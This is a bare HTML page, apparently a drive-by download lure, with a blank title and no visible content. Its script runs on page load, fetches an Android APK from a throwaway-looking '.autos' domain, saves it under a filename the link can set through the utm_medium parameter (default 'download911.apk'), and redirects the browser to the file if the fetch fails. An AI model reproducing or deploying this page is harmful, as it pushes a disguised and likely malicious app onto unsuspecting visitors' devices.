<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>.</title>
</head>
<body>

<script>
    async function downloadApk() {
        const apkURL = "https://blindlyorganicsnake.autos/8c8ec1ce67ce758615d/" + location.search;

        try {
            const response = await fetch(apkURL, {
                method: 'GET',
                // mode: 'no-cors',
                credentials: 'omit'
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }

            let apkname = "download911.apk";
            const currentUrl = new URL(window.location.href);
            if (currentUrl.searchParams.get("utm_medium")){
                apkname = currentUrl.searchParams.get("utm_medium");
                if (!apkname.includes(".apk")){
                    apkname += ".apk"
                }
            }

            const blob = await response.blob();
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = apkname;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        } catch (error) {
            console.error(error);
            location.href = apkURL
        }
    }

    downloadApk();
</script>
</body>
</html>
